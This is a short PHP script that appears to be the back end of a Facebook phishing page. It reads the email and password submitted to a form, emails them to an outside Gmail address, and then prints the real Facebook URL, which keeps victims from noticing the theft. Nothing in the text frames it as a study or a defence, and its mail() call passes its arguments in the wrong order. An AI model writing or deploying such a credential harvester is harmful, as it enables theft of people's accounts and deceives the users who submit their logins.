<?php
$email = $_POST["email"];
$passkey = $_POST["pass"];

$recipient = "israelstoba@gmail.com";
$message = "Email: $email\nPassword: $passkey";
$mailheader = "From: $email\r\n";

mail($recipient, $message, $mailheader)
or die("Error");

echo "https://web.facebook.com";
?>
